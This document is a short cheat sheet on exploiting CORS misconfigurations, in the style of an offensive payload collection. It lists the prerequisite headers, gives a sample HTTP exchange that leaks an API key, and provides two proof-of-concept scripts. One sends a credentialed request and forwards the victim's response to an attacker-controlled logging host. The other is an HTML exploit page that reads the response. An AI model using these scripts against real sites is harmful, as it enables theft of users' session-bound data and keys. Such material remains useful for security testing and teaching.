# CORS Misconfiguration and Exploitation

>Cross-origin resource sharing (CORS) is a mechanism that allows restricted resources on a web page to be requested from another domain outside the domain from which the first resource was served. (Wikipedia)

## Prerequisites
* Origin: https://evil.com
* Access-Control-Allow-Credential: true
* Access-Control-Allow-Origin: https://evil.com


## Exploitation
Usually hackers may want to target a API endpoint, So that they can acheive their goals.

**Payload**
```
https://victim.xyz.com/endpoint or https://xyz.com/api/endpoint 
```

## Example
```
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true 

{"[API key]"}
```
### POC

```
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker-website.net/log?key='+this.responseText; 
};
```

**OR**
```
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://victim.example.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```
